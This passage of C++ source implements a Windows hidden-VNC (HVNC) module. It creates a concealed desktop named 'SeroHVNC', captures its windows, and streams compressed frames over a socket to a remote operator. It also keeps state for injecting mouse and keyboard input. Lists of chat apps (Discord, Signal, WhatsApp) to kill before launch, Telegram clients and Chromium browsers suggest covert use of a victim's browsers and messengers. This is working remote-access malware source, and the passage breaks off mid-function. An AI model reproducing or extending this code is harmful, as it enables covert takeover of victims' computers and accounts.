#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <commctrl.h>
#include <uxtheme.h>
#include <dwmapi.h>
#include <shlobj.h>
#include <shellapi.h>
#include <propidl.h>
#include <gdiplus.h>
#include <objidl.h>
#include <tlhelp32.h>
#include <algorithm>
#include <atomic>
#include <cstdint>
#include <cstring>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <queue>
#include <deque>
#include <utility>
#include <condition_variable>
#include <iostream>
#include <filesystem>
#include <chrono>
#include <map>
#include <set>
#include <fstream>
#include "../../include/json.hpp"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "uxtheme.lib")
#pragma comment(lib, "dwmapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

using json = nlohmann::json;
using namespace Gdiplus;
using namespace std;
namespace fs = std::filesystem;

#ifndef PW_RENDERFULLCONTENT
#define PW_RENDERFULLCONTENT 0x00000002
#endif

#ifndef WINSTA_ALL_ACCESS
#define WINSTA_ALL_ACCESS 0x0000037F
#endif

#pragma pack(push, 1)
struct PacketHeader {
    uint16_t signature;
    uint8_t type;
    uint32_t size;
};

struct HVNCFrameHeader {
    uint32_t monitor;
    uint32_t scale;
    uint32_t fps;
    uint32_t width;
    uint32_t height;
    uint32_t format;
    uint32_t dataSize;
    uint32_t dirtyX;
    uint32_t dirtyY;
    uint32_t dirtyWidth;
    uint32_t dirtyHeight;
};
#pragma pack(pop)

static const uint16_t PACKET_SIGNATURE = 0x524E;
static const uint8_t PACKET_TYPE_HVNC_FRAME = 0x06;
static const uint32_t FRAME_FORMAT_JPEG = 1;
static const uint32_t FRAME_FORMAT_JPEG_DIRTY = 2;
static const uint32_t FRAME_FORMAT_JPEG_COMPRESSED = 3;
static const uint32_t FRAME_FORMAT_JPEG_DIRTY_COMPRESSED = 4;

static atomic_bool g_captureRunning(false);
static thread g_captureThread;
static mutex g_captureMutex;
static mutex g_sendMutex;
static SOCKET g_socket = INVALID_SOCKET;
static int g_scalePercent = 50;
static int g_targetFps = 15;

static HDESK g_hHiddenDesktop = NULL;
static wstring g_desktopName = L"SeroHVNC";
static int g_canvasW = 1920;
static int g_canvasH = 1080;

static mutex g_gdiplusMutex;
static ULONG_PTR g_gdiplusToken = 0;

struct BitmapSlot {
    HBITMAP hBmp = NULL;
    int width = 0;
    int height = 0;
    bool inUse = false;
};

struct CapturedFrame {
    int slotIndex;
    int width;
    int height;
    int scale;
    int fps;
    bool forceFull;
};

struct EncodedFrame {
    vector<unsigned char> jpeg;
    int width;
    int height;
    int scale;
    int fps;
    int dirtyX;
    int dirtyY;
    int dirtyWidth;
    int dirtyHeight;
    uint32_t format;
};

static const size_t MAX_CAPTURE_QUEUE = 2;
static const size_t MAX_SEND_QUEUE = 2;
static vector<BitmapSlot> g_bitmapSlots(2);
static deque<CapturedFrame> g_captureQueue;
static deque<EncodedFrame> g_sendQueue;
static mutex g_frameMutex;
static condition_variable g_frameCV;
static condition_variable g_sendCV;
static thread g_encodeThread;
static thread g_sendThread;
static atomic_bool g_encodeRunning(false);
static atomic_bool g_sendRunning(false);
static mutex g_logMutex;

// Input Worker
struct InputTask {
    string action;
    json cmd;
};
static deque<InputTask> g_inputQueue;
static mutex g_inputMutex;
static condition_variable g_inputCV;
static thread g_inputThread;
static atomic_bool g_inputRunning(false);

// Window caching
struct WinCache {
    HDC hdc = NULL;
    HBITMAP hbm = NULL;
    void* bits = nullptr;
    int w = 0;
    int h = 0;
};

static std::map<HWND, WinCache> g_winCache;
static HDC g_compHdcRef = NULL;

// Coordinates & state
static int g_curX = 960, g_curY = 540;
static bool g_movingWindow = false;
static HWND g_movingHwnd = NULL;
static int g_moveOffX = 0, g_moveOffY = 0, g_moveSizeW = 0, g_moveSizeH = 0;
static HWND g_captionFwdHwnd = NULL;
static HWND g_lbDownHwnd = NULL;
static bool g_leftButtonDown = false;
static long long g_lastLeftMs = 0;
static int g_lastClickX = 0, g_lastClickY = 0;

// Keyboard modifier states
static bool g_shiftDown = false;
static bool g_ctrlDown = false;
static bool g_altDown = false;
static bool g_capsLock = false;

// Single instance tracking
static mutex g_pidsMutex;
static std::map<string, DWORD> g_launchedPids;

// Conflict apps and others
static const std::set<string> g_killBeforeLaunch = { "discord.exe", "signal.exe", "whatsapp.exe" };
static const std::set<string> g_qtManyApps = { "telegram.exe", "ayugram.exe" };
static const std::set<string> g_multiInstance = { "cmd.exe", "notepad.exe" };
static const std::set<string> g_chromiumBrowsers = { "chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "vivaldi.exe", "chromium.exe" };

static atomic_int g_staticFrameCount(0);
static atomic_bool g_forceFullFrame(false);
static atomic<DWORD> g_lastInteractiveFullFrameTick(0);

static void request_full_frame(bool immediate = true) {
    DWORD now = GetTickCount();
    if (immediate) {
        g_lastInteractiveFullFrameTick = now;
        g_forceFullFrame = true;
        return;
    }

    DWORD last = g_lastInteractiveFullFrameTick.load();
    if (last == 0 || now - last >= 120) {
        g_lastInteractiveFullFrameTick = now;
        g_forceFullFrame = true;
    }
}

// -----------------------------------------------------------------------

static bool safe_send_json(SOCKET sock, const json& data) {
    if (sock == INVALID_SOCKET) return false;
    lock_guard<mutex> lock(g_sendMutex);
    string serialized = data.dump() + "\r\n";
    const char* ptr = serialized.c_str();
    int remaining = (int)serialized.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static void send_status(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json status;
    status["action"] = "hvnc_status";
    status["message"] = msg;
    safe_send_json(g_socket, status);
}

static void send_error(const string& msg) {
    if (g_socket == INVALID_SOCKET) return;
    json err;
    err["action"] = "hvnc_error";
    err["message"] = msg;
    safe_send_json(g_socket, err);
}

static void SendHvncProgress(int pct, const string& label) {
    if (pct < 100) {
        send_status(label + " (" + to_string(pct) + "%)");
    } else {
        send_status(label + " Done.");
    }
}

static bool safe_send_hvnc_frame(SOCKET sock, int scale, int fps, int width, int height,
                                 int dirtyX, int dirtyY, int dirtyWidth, int dirtyHeight,
                                 uint32_t format, const vector<unsigned char>& jpegBytes) {
    if (jpegBytes.empty() || sock == INVALID_SOCKET) return false;

    HVNCFrameHeader frameHeader{};
    frameHeader.monitor     = 0;
    frameHeader.scale       = (uint32_t)scale;
    frameHeader.fps         = (uint32_t)fps;
    frameHeader.width       = (uint32_t)width;
    frameHeader.height      = (uint32_t)height;
    frameHeader.format      = format;
    frameHeader.dataSize    = (uint32_t)jpegBytes.size();
    frameHeader.dirtyX      = (uint32_t)dirtyX;
    frameHeader.dirtyY      = (uint32_t)dirtyY;
    frameHeader.dirtyWidth  = (uint32_t)dirtyWidth;
    frameHeader.dirtyHeight = (uint32_t)dirtyHeight;

    PacketHeader packetHeader{};
    packetHeader.signature = PACKET_SIGNATURE;
    packetHeader.type      = PACKET_TYPE_HVNC_FRAME;
    packetHeader.size      = (uint32_t)(sizeof(HVNCFrameHeader) + jpegBytes.size());

    vector<unsigned char> packet;
    packet.resize(sizeof(PacketHeader) + packetHeader.size);
    memcpy(packet.data(), &packetHeader, sizeof(PacketHeader));
    memcpy(packet.data() + sizeof(PacketHeader), &frameHeader, sizeof(HVNCFrameHeader));
    memcpy(packet.data() + sizeof(PacketHeader) + sizeof(HVNCFrameHeader), jpegBytes.data(), jpegBytes.size());

    lock_guard<mutex> lock(g_sendMutex);
    const char* ptr = (const char*)packet.data();
    int remaining = (int)packet.size();
    while (remaining > 0) {
        int sent = send(sock, ptr, remaining, 0);
        if (sent == SOCKET_ERROR || sent <= 0) return false;
        ptr += sent;
        remaining -= sent;
    }
    return true;
}

static bool ensure_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) return true;
    GdiplusStartupInput input;
    return GdiplusStartup(&g_gdiplusToken, &input, NULL) == Ok;
}

static void shutdown_gdiplus() {
    lock_guard<mutex> lock(g_gdiplusMutex);
    if (g_gdiplusToken != 0) {
        GdiplusShutdown(g_gdiplusToken);
        g_gdiplusToken = 0;
    }
}

static void initialize_visual_styles() {
    INITCOMMONCONTROLSEX icc{};
    icc.dwSize = sizeof(icc);
    icc.dwICC = ICC_WIN95_CLASSES | ICC_STANDARD_CLASSES | ICC_BAR_CLASSES | ICC_LISTVIEW_CLASSES | ICC_TREEVIEW_CLASSES;
    InitCommonControlsEx(&icc);
    SetThemeAppProperties(STAP_ALLOW_NONCLIENT | STAP_ALLOW_CONTROLS | STAP_ALLOW_WEBCONTENT);
}

static int get_encoder_clsid(const WCHAR* mimeType, CLSID* clsid) {
    UINT count = 0, size = 0;
    GetImageEncodersSize(&count, &size);
    if (size == 0) return -1;
    vector<unsigned char> buffer(size);
    ImageCodecInfo* codecs = reinterpret_cast<ImageCodecInfo*>(buffer.data());
    if (GetImageEncoders(count, size, codecs) != Ok) return -1;
    for (UINT i = 0; i < count; ++i) {
        if (wcscmp(codecs[i].MimeType, mimeType) == 0) {
            *clsid = codecs[i].Clsid;
            return (int)i;
        }
    }
    return -1;
}

static bool bitmap_to_jpeg_from_hbmp(HBITMAP hBmp, ULONG quality, vector<unsigned char>& bytes) {
    if (!ensure_gdiplus()) return false;
    static CLSID clsid;
    static bool clsidReady = false;
    if (!clsidReady) {
        if (get_encoder_clsid(L"image/jpeg", &clsid) < 0) return false;
        clsidReady = true;
    }
    Bitmap bmp(hBmp, NULL);
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) return false;
    EncoderParameters params;
    params.Count = 1;
    params.Parameter[0].Guid              = EncoderQuality;
    params.Parameter[0].Type             = EncoderParameterValueTypeLong;
    params.Parameter[0].NumberOfValues   = 1;
    params.Parameter[0].Value            = &quality;
    if (bmp.Save(stream, &clsid, &params) != Ok) { stream->Release(); return false; }
    STATSTG stat;
    stream->Stat(&stat, STATFLAG_NONAME);
    bytes.resize((size_t)stat.cbSize.QuadPart);
    LARGE_INTEGER li = {0};
    stream->Seek(li, STREAM_SEEK_SET, NULL);
    ULONG read;
    stream->Read(bytes.data(), (ULONG)bytes.size(), &read);
    stream->Release();
    return true;
}

// -------------------------------------------------------------------------
//  DIBSection & Composite Setup
// -------------------------------------------------------------------------

static BITMAPINFO MakeBmi(int w, int h) {
    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = -h; // negative = top-down
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    return bmi;
}

static WinCache* GetOrCreateCache(HWND hwnd, int w, int h) {
    auto it = g_winCache.find(hwnd);
    if (it != g_winCache.end() && it->second.w == w && it->second.h == h) {
        return &it->second;
    }
    if (it != g_winCache.end()) {
        if (it->second.hbm) DeleteObject(it->second.hbm);
        if (it->second.hdc) DeleteDC(it->second.hdc);
        g_winCache.erase(it);
    }
    HDC hdc = CreateCompatibleDC(g_compHdcRef);
    if (!hdc) return nullptr;
    BITMAPINFO bmi = MakeBmi(w, h);
    void* bits = nullptr;
    HBITMAP hbm = CreateDIBSection(g_compHdcRef, &bmi, DIB_RGB_COLORS, &bits, NULL, 0);
    if (!hbm || !bits) {
        DeleteDC(hdc);
        return nullptr;
    }
    SelectObject(hdc, hbm);
    WinCache entry;
    entry.hdc = hdc;
    entry.hbm = hbm;
    entry.bits = bits;
    entry.w = w;
    entry.h = h;
    g_winCache[hwnd] = entry;
    return &g_winCache[hwnd];
}

static void FreeWinCache() {
    for (auto& pair : g_winCache) {
        if (pair.second.hbm) DeleteObject(pair.second.hbm);
        if (pair.second.hdc) DeleteDC(pair.second.hdc);
    }
    g_winCache.clear();
}

static void ensure_desktop() {
    if (g_hHiddenDesktop) return;

    // Switch process window station to WinSta0 when running as SYSTEM
    HWINSTA hWinSta = OpenWindowStationW(L"WinSta0", FALSE, WINSTA_ALL_ACCESS);
    if (hWinSta) {
        SetProcessWindowStation(hWinSta);
    }

    g_hHiddenDesktop = OpenDesktopW(g_desktopName.c_str(), 0, FALSE, GENERIC_ALL);
    if (!g_hHiddenDesktop) {
        g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
    }
}

// -------------------------------------------------------------------------
//  Pipeline Slot Allocation
// -------------------------------------------------------------------------

static void release_slot_locked(int slotIndex) {
    if (slotIndex >= 0 && slotIndex < (int)g_bitmapSlots.size()) {
        g_bitmapSlots[slotIndex].inUse = false;
    }
}

static bool has_free_frame_slot_locked() {
    for (const BitmapSlot& slot : g_bitmapSlots) {
        if (!slot.inUse) return true;
    }
    return !g_captureQueue.empty();
}

static int acquire_frame_slot_locked(HDC hdcScreen, int width, int height) {
    int slotIndex = -1;
    for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
        if (!g_bitmapSlots[i].inUse) {
            slotIndex = (int)i;
            break;
        }
    }

    while (slotIndex < 0 && !g_captureQueue.empty()) {
        CapturedFrame oldFrame = g_captureQueue.front();
        g_captureQueue.pop_front();
        release_slot_locked(oldFrame.slotIndex);
        for (size_t i = 0; i < g_bitmapSlots.size(); ++i) {
            if (!g_bitmapSlots[i].inUse) {
                slotIndex = (int)i;
                break;
            }
        }
    }

    if (slotIndex < 0) return -1;

    BitmapSlot& slot = g_bitmapSlots[slotIndex];
    if (!slot.hBmp || slot.width != width || slot.height != height) {
        if (slot.hBmp) {
            DeleteObject(slot.hBmp);
            slot.hBmp = NULL;
        }
        slot.hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
        slot.width = width;
        slot.height = height;
    }
    if (!slot.hBmp) return -1;

    slot.inUse = true;
    return slotIndex;
}

static bool read_bitmap_pixels(HBITMAP hBmp, int width, int height, vector<uint32_t>& pixels) {
    if (!hBmp || width <= 0 || height <= 0) return false;

    BITMAPINFO bmi{};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    pixels.resize((size_t)width * (size_t)height);
    HDC hdc = GetDC(NULL);
    int rows = GetDIBits(hdc, hBmp, 0, (UINT)height, pixels.data(), &bmi, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);
    return rows == height;
}

// -------------------------------------------------------------------------
//  Dirty Rect & Blit Helpers
// -------------------------------------------------------------------------

static bool find_dirty_rect(const vector<uint32_t>& current, vector<uint32_t>& previous,
                            int width, int height, RECT& dirty, bool& forceFull) {
    forceFull = previous.size() != current.size();
    if (forceFull) {
        previous = current;
        dirty.left = 0;
        dirty.top = 0;
        dirty.right = width;
        dirty.bottom = height;
        return true;
    }

    if (memcmp(current.data(), previous.data(), current.size() * sizeof(uint32_t)) == 0) {
        return false;
    }

    int left = width;
    int top = height;
    int right = -1;
    int bottom = -1;

    const uint32_t* pCurr = current.data();
    const uint32_t* pPrev = previous.data();

    for (int y = 0; y < height; ++y) {
        const uint32_t* rowCurr = pCurr + (size_t)y * width;
        const uint32_t* rowPrev = pPrev + (size_t)y * width;

        if (memcmp(rowCurr, rowPrev, width * sizeof(uint32_t)) == 0) {
            continue;
        }

        if (y < top) top = y;
        if (y > bottom) bottom = y;

        for (int x = 0; x < width; ++x) {
            if (rowCurr[x] != rowPrev[x]) {
                if (x < left) left = x;
                if (x > right) right = x;
            }
        }
    }

    if (right < left || bottom < top) return false;

    previous = current;
    dirty.left = max(0, left - 4);
    dirty.top = max(0, top - 4);
    dirty.right = min(width, right + 5);
    dirty.bottom = min(height, bottom + 5);
    return true;
}

static bool copy_bitmap_region(HBITMAP hSource, int x, int y, int width, int height,
                               HBITMAP& hCrop, HDC hdcSource, HDC hdcCrop,
                               HGDIOBJ& hOldSource, HGDIOBJ& hOldCrop,
                               int& cropWidth, int& cropHeight) {
    if (!hSource || width <= 0 || height <= 0) return false;

    HDC hdcScreen = GetDC(NULL);
    if (!hCrop || cropWidth != width || cropHeight != height) {
        if (hCrop) {
            SelectObject(hdcCrop, hOldCrop);
            DeleteObject(hCrop);
            hCrop = NULL;
            hOldCrop = NULL;
        }
        hCrop = CreateCompatibleBitmap(hdcScreen, width, height);
        if (!hCrop) {
            ReleaseDC(NULL, hdcScreen);
            return false;
        }
        hOldCrop = SelectObject(hdcCrop, hCrop);
        cropWidth = width;
        cropHeight = height;
    }
    ReleaseDC(NULL, hdcScreen);

    hOldSource = SelectObject(hdcSource, hSource);
    BitBlt(hdcCrop, 0, 0, width, height, hdcSource, x, y, SRCCOPY);
    SelectObject(hdcSource, hOldSource);
    hOldSource = NULL;
    return true;
}

// -------------------------------------------------------------------------
//  LZNT1 Compression
// -------------------------------------------------------------------------

typedef NTSTATUS (NTAPI *pfnRtlGetCompressionWorkSpaceSize)(
    USHORT CompressionFormatAndEngine,
    PULONG CompressBufferWorkSpaceSize,
    PULONG CompressFragmentWorkSpaceSize
);

typedef NTSTATUS (NTAPI *pfnRtlCompressBuffer)(
    USHORT CompressionFormatAndEngine,
    PUCHAR SourceBuffer,
    ULONG SourceBufferLength,
    PUCHAR DestinationBuffer,
    ULONG DestinationBufferLength,
    ULONG ChunkSize,
    PULONG UncompressedChunkSize,
    PVOID WorkSpace
);

static bool compress_buffer(const std::vector<unsigned char>& input, std::vector<unsigned char>& output) {
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    if (!hNtDll) return false;

    auto RtlGetCompressionWorkSpaceSize = (pfnRtlGetCompressionWorkSpaceSize)GetProcAddress(hNtDll, "RtlGetCompressionWorkSpaceSize");
    auto RtlCompressBuffer = (pfnRtlCompressBuffer)GetProcAddress(hNtDll, "RtlCompressBuffer");

    if (!RtlGetCompressionWorkSpaceSize || !RtlCompressBuffer) return false;

    USHORT format = 2; // COMPRESSION_FORMAT_LZNT1
    ULONG workSpaceSize = 0, fragmentSize = 0;
    if (RtlGetCompressionWorkSpaceSize(format, &workSpaceSize, &fragmentSize) != 0) return false;

    std::vector<unsigned char> workSpace(workSpaceSize);
    ULONG maxCompressedSize = (ULONG)input.size() + (ULONG)(input.size() / 10) + 1024;
    std::vector<unsigned char> tempCompressed(maxCompressedSize);

    ULONG compressedSize = 0;
    NTSTATUS status = RtlCompressBuffer(
        format,
        (PUCHAR)input.data(),
        (ULONG)input.size(),
        (PUCHAR)tempCompressed.data(),
        maxCompressedSize,
        4096,
        &compressedSize,
        workSpace.data()
    );

    if (status == 0) { // STATUS_SUCCESS
        output.resize(4 + compressedSize);
        uint32_t originalSize = (uint32_t)input.size();
        std::memcpy(output.data(), &originalSize, 4);
        std::memcpy(output.data() + 4, tempCompressed.data(), compressedSize);
        return true;
    }
    return false;
}

// -------------------------------------------------------------------------
//  Capture Pipeline Threads
// -------------------------------------------------------------------------

static void encode_worker() {
    vector<uint32_t> previousPixels;
    vector<uint32_t> currentPixels;
    HDC hdcSource = CreateCompatibleDC(NULL);
    HDC hdcCrop = CreateCompatibleDC(NULL);
    HBITMAP hCrop = NULL;
    HGDIOBJ hOldSource = NULL;
    HGDIOBJ hOldCrop = NULL;
    int cropWidth = 0;
    int cropHeight = 0;

    while (g_encodeRunning) {
        CapturedFrame data{};
        HBITMAP hBmp = NULL;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_frameCV.wait(lock, [] { return !g_captureQueue.empty() || !g_encodeRunning; });
            if (!g_encodeRunning && g_captureQueue.empty()) break;

            while (g_captureQueue.size() > 1) {
                release_slot_locked(g_captureQueue.front().slotIndex);
                g_captureQueue.pop_front();
            }

            data = g_captureQueue.front();
            g_captureQueue.pop_front();
            if (data.slotIndex >= 0 && data.slotIndex < (int)g_bitmapSlots.size()) {
                hBmp = g_bitmapSlots[data.slotIndex].hBmp;
            }
        }

        vector<unsigned char> jpeg;
        RECT dirty = {0, 0, data.width, data.height};
        bool forceFull = false;
        bool hasDirty = false;
        bool encoded = false;
        uint32_t format = FRAME_FORMAT_JPEG;

        if (hBmp && read_bitmap_pixels(hBmp, data.width, data.height, currentPixels)) {
            hasDirty = find_dirty_rect(currentPixels, previousPixels, data.width, data.height, dirty, forceFull);
        } else {
            hasDirty = true;
            forceFull = true;
            previousPixels.clear();
        }

        if (data.forceFull) {
            hasDirty = true;
            forceFull = true;
            dirty.left = 0;
            dirty.top = 0;
            dirty.right = data.width;
            dirty.bottom = data.height;
        }

        if (hasDirty) {
            int dirtyWidth = dirty.right - dirty.left;
            int dirtyHeight = dirty.bottom - dirty.top;
            bool useDirty = !forceFull && dirtyWidth > 0 && dirtyHeight > 0 &&
                            (dirtyWidth * dirtyHeight) < ((data.width * data.height) * 85 / 100);

            if (useDirty &&
                copy_bitmap_region(hBmp, dirty.left, dirty.top, dirtyWidth, dirtyHeight,
                                   hCrop, hdcSource, hdcCrop, hOldSource, hOldCrop,
                                   cropWidth, cropHeight)) {
                encoded = bitmap_to_jpeg_from_hbmp(hCrop, (ULONG)data.scale, jpeg);
                format = FRAME_FORMAT_JPEG_DIRTY;
            } else {
                dirty.left = 0;
                dirty.top = 0;
                dirty.right = data.width;
                dirty.bottom = data.height;
                encoded = bitmap_to_jpeg_from_hbmp(hBmp, (ULONG)data.scale, jpeg);
                format = FRAME_FORMAT_JPEG;
            }
            g_staticFrameCount = 0;
        } else {
            g_staticFrameCount++;
        }

        {
            lock_guard<mutex> lock(g_frameMutex);
            release_slot_locked(data.slotIndex);
        }

        if (encoded) {
            std::vector<unsigned char> compressed;
            uint32_t finalFormat = format;
            if (compress_buffer(jpeg, compressed)) {
                if (compressed.size() < jpeg.size()) {
                    jpeg = std::move(compressed);
                    if (format == FRAME_FORMAT_JPEG) {
                        finalFormat = FRAME_FORMAT_JPEG_COMPRESSED;
                    } else if (format == FRAME_FORMAT_JPEG_DIRTY) {
                        finalFormat = FRAME_FORMAT_JPEG_DIRTY_COMPRESSED;
                    }
                }
            }

            lock_guard<mutex> lock(g_frameMutex);
            while (g_sendQueue.size() >= MAX_SEND_QUEUE) {
                g_sendQueue.pop_front();
            }
            g_sendQueue.push_back({std::move(jpeg), data.width, data.height, data.scale, data.fps,
                                   dirty.left, dirty.top, dirty.right - dirty.left, dirty.bottom - dirty.top,
                                   finalFormat});
            g_sendCV.notify_one();
        }
    }

    if (hCrop) {
        SelectObject(hdcCrop, hOldCrop);
        DeleteObject(hCrop);
    }
    DeleteDC(hdcSource);
    DeleteDC(hdcCrop);

    lock_guard<mutex> lock(g_frameMutex);
    while (!g_captureQueue.empty()) {
        release_slot_locked(g_captureQueue.front().slotIndex);
        g_captureQueue.pop_front();
    }
}

static void send_worker() {
    while (g_sendRunning) {
        EncodedFrame data;
        {
            unique_lock<mutex> lock(g_frameMutex);
            g_sendCV.wait(lock, [] { return !g_sendQueue.empty() || !g_sendRunning; });
            if (!g_sendRunning && g_sendQueue.empty()) break;

            while (g_sendQueue.size() > 1) {
                g_sendQueue.pop_front();
            }

            data = std::move(g_sendQueue.front());
            g_sendQueue.pop_front();
        }

        safe_send_hvnc_frame(g_socket, data.scale, data.fps, data.width, data.height,
                             data.dirtyX, data.dirtyY, data.dirtyWidth, data.dirtyHeight,
                             data.format, data.jpeg);
    }
}

static void capture_loop() {
    ensure_desktop();
    if (!g_hHiddenDesktop) {
        g_captureRunning = false;
        return;
    }

    if (!SetThreadDesktop(g_hHiddenDesktop)) {
        g_captureRunning = false;
        return;
    }

    g_compHdcRef = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    if (sw <= 0) sw = 1920;
    if (sh <= 0) sh = 1080;

    g_canvasW = sw;
    g_canvasH = sh;

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmpMem = CreateCompatibleBitmap(hdcScreen, sw, sh);
    HGDIOBJ hOldMem = SelectObject(hdcMem, hbmpMem);

    HDC hdcWin = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmpWin = NULL;
    HGDIOBJ hOldWin = NULL;
    int winBmpWidth = 0;
    int winBmpHeight = 0;

    HDC hdcFinal = CreateCompatibleDC(hdcScreen);

    DWORD lastFullFrame = 0;

    while (g_captureRunning) {
        DWORD start = GetTickCount();

        int scale, fps;
        {
            lock_guard<mutex> lock(g_captureMutex);
            scale = g_scalePercent;
            fps   = g_targetFps;
        }

        int staticFrames = g_staticFrameCount.load();
        if (staticFrames > 60) fps = 1;
        else if (staticFrames > 30) fps = max(1, fps / 4);
        else if (staticFrames > 12) fps = max(2, fps / 2);

        int dw = (sw * scale) / 100;
        int dh = (sh * scale) / 100;
        if (dw < 1) dw = 1; if (dh < 1) dh = 1;

        int slotIndex = -1;
        {
            lock_guard<mutex> lock(g_frameMutex);
            if (has_free_frame_slot_locked()) {
                slotIndex = acquire_frame_slot_locked(hdcScreen, dw, dh);
            }
        }

        if (slotIndex < 0) {
            DWORD interval = 1000 / (fps > 0 ? fps : 1);
            Sleep(max<DWORD>(5, interval / 2));
            continue;
        }

        // Fill background
        PatBlt(hdcMem, 0, 0, sw, sh, BLACKNESS);

        DWORD now = GetTickCount();
        DWORD fullFrameInterval = staticFrames > 30 ? 7000 : 3000;
        bool forceFullFrame = g_forceFullFrame.exchange(false) || (lastFullFrame == 0) || (now - lastFullFrame >= fullFrameInterval);

        // Blit and scale walking the Z-order from bottom to top using EnumDesktopWindows
        std::vector<HWND> windows;
        struct EnumParam {
            std::vector<HWND>* list;
        } param = { &windows };

        EnumDesktopWindows(g_hHiddenDesktop, [](HWND hwnd, LPARAM lParam) -> BOOL {
            auto p = reinterpret_cast<EnumParam*>(lParam);
            p->list->push_back(hwnd);
            return TRUE;
        }, reinterpret_cast<LPARAM>(&param));

        // EnumDesktopWindows enumerates top to bottom. Reverse to draw bottom to top.
        std::reverse(windows.begin(), windows.end());

        std::vector<std::pair<HWND, RECT>> toProcess;
        std::set<HWND> alive;

        for (HWND cur : windows) {
            alive.insert(cur);
            if (!IsWindowVisible(cur) || IsIconic(cur)) continue;
            RECT r;
            if (!GetWindowRect(cur, &r)) continue;
            if (r.right <= r.left || r.bottom <= r.top) continue;
            if (r.right <= 0 || r.bottom <= 0 || r.left >= sw || r.top >= sh) continue;
            toProcess.push_back({cur, r});
        }

        // Remove stale entries from cache
        std::vector<HWND> stale;
        for (auto& pair : g_winCache) {
            if (alive.find(pair.first) == alive.end()) {
                stale.push_back(pair.first);
            }
        }
        for (HWND hwnd : stale) {
            auto it = g_winCache.find(hwnd);
            if (it != g_winCache.end()) {
                if (it->second.hbm) DeleteObject(it->second.hbm);
                if (it->second.hdc) DeleteDC(it->second.hdc);
                g_winCache.erase(it);
            }
        }

        for (auto& item : toProcess) {
            HWND hwnd = item.first;
            RECT r = item.second;
            int ww = r.right - r.left;
            int wh = r.bottom - r.top;

            if (!hbmpWin || ww > winBmpWidth || wh > winBmpHeight) {
                if (hbmpWin) {
                    SelectObject(hdcWin, hOldWin);
                    DeleteObject(hbmpWin);
                    hbmpWin = NULL;
                    hOldWin = NULL;
                }
                hbmpWin = CreateCompatibleBitmap(hdcScreen, ww, wh);
                if (!hbmpWin) continue;
                hOldWin = SelectObject(hdcWin, hbmpWin);
                winBmpWidth = ww;
                winBmpHeight = wh;
            }

            PatBlt(hdcWin, 0, 0, ww, wh, BLACKNESS);
            bool printSuccess = PrintWindow(hwnd, hdcWin, PW_RENDERFULLCONTENT);
            if (!printSuccess) {
                printSuccess = PrintWindow(hwnd, hdcWin, 0);
            }
            if (!printSuccess) {
                HDC hdcRealWin = GetWindowDC(hwnd);
                if (hdcRealWin) {
                    BitBlt(hdcWin, 0, 0, ww, wh, hdcRealWin, 0, 0, SRCCOPY);
                    ReleaseDC(hwnd, hdcRealWin);
                } else {
                    continue;
                }
            }

            BitBlt(hdcMem, r.left, r.top, ww, wh, hdcWin, 0, 0, SRCCOPY);
        }

        // Draw cursor
        HCURSOR hArrow = LoadCursorW(NULL, (LPCWSTR)32512); // IDC_ARROW = 32512
        if (hArrow && g_curX >= 0 && g_curY >= 0 && g_curX < sw && g_curY < sh) {
            DrawIconEx(hdcMem, g_curX, g_curY, hArrow, 0, 0, 0, NULL, DI_NORMAL);
        }

        HGDIOBJ hOldFinal = SelectObject(hdcFinal, g_bitmapSlots[slotIndex].hBmp);
        SetStretchBltMode(hdcFinal, COLORONCOLOR);
        StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
        SelectObject(hdcFinal, hOldFinal);

        {
            lock_guard<mutex> lock(g_frameMutex);
            while (g_captureQueue.size() >= MAX_CAPTURE_QUEUE) {
                release_slot_locked(g_captureQueue.front().slotIndex);
                g_captureQueue.pop_front();
            }
            g_captureQueue.push_back({slotIndex, dw, dh, scale, fps, forceFullFrame});
            if (forceFullFrame) lastFullFrame = now;
            g_frameCV.notify_one();
        }

        DWORD elapsed = GetTickCount() - start;
        DWORD interval = 1000 / (fps > 0 ? fps : 1);
        if (elapsed < interval) Sleep(interval - elapsed);
    }

    SelectObject(hdcMem, hOldMem);
    if (hbmpWin) {
        SelectObject(hdcWin, hOldWin);
        DeleteObject(hbmpWin);
    }
    DeleteObject(hbmpMem);
    DeleteDC(hdcMem);
    DeleteDC(hdcWin);
    DeleteDC(hdcFinal);
    ReleaseDC(NULL, hdcScreen);

